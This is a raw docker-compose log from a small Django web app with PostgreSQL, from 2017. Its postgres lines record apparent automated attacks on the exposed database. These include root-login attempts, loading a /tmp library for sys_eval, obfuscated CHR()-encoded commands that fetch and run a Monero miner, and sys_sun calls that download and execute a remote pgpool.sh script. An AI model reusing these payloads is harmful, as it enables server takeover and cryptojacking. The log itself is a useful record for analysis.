Attaching to cohvis_nginx_1, cohvis_web_1, cohvis_postgres_1
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m   Resource u'corpora/stopwords' not found.  Please use the NLTK
[33mweb_1       |[0m   Downloader to obtain the resource:  >>> nltk.download()
[33mweb_1       |[0m   Searched in:
[33mweb_1       |[0m     - '/code/nltk_data'
[33mweb_1       |[0m     - '/usr/share/nltk_data'
[33mweb_1       |[0m     - '/usr/local/share/nltk_data'
[33mweb_1       |[0m     - '/usr/lib/nltk_data'
[33mweb_1       |[0m     - '/usr/local/lib/nltk_data'
[33mweb_1       |[0m **********************************************************************
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker reloading: /code/cohapp/views.py modified
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker reloading: /code/cohapp/views.py modified
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-06 08:04:45 +0000] [56] [INFO] Booting worker with pid: 56
[33mweb_1       |[0m [2017-04-06 08:04:45 +0000] [58] [INFO] Booting worker with pid: 58
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-06 10:09:51 +0000] [56] [INFO] Worker reloading: /code/toolapp/settings.py modified
[33mweb_1       |[0m [2017-04-06 10:09:51 +0000] [56] [INFO] Worker exiting (pid: 56)
[33mweb_1       |[0m [2017-04-06 10:09:52 +0000] [58] [INFO] Worker reloading: /code/toolapp/settings.py modified
[33mweb_1       |[0m [2017-04-06 10:09:52 +0000] [58] [INFO] Worker exiting (pid: 58)
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
[32mpostgres_1  |[0m ERROR:  table "gavudb" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE gavudb
[32mpostgres_1  |[0m ERROR:  large object 5632 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(5632)
[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsenqj.so": version mismatch
[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libsenqj.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
[32mpostgres_1  |[0m ERROR:  table "qrljkc" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE qrljkc
[32mpostgres_1  |[0m ERROR:  large object 9015 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(9015)
[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libscxjp.so": version mismatch
[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libscxjp.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
[32mpostgres_1  |[0m ERROR:  table "mxwnjn" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE mxwnjn
[32mpostgres_1  |[0m ERROR:  large object 9883 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(9883)
[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsrzoq.so": version mismatch
[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libsrzoq.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://23.239.23.122/pgpool.sh -O /tmp/pgpool.sh;curl http://23.239.23.122/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 27265.28208: server supports 1.0 to 3.0
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m LOG:  invalid length of startup packet
[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 26121) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-20 09:28:52 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  invalid record length at 0/173D5C8: wanted 24, got 0
[32mpostgres_1  |[0m LOG:  redo is not required
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m LOG:  incomplete startup packet
[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 27218) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[33mweb_1       |[0m [2017-04-06 08:09:52 +0000] [104] [INFO] Booting worker with pid: 104
[33mweb_1       |[0m [2017-04-06 08:09:52 +0000] [106] [INFO] Booting worker with pid: 106
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/models.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/models.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/serializers.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/serializers.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker exiting (pid: 106)
[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker exiting (pid: 104)
[33mweb_1       |[0m [2017-04-07 09:08:46 +0000] [104] [INFO] Worker reloading: /code/cohapp/models.py modified
[33mweb_1       |[0m [2017-04-07 07:08:48 +0000] [216] [INFO] Booting worker with pid: 216
[33mweb_1       |[0m [2017-04-07 07:08:48 +0000] [217] [INFO] Booting worker with pid: 217
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
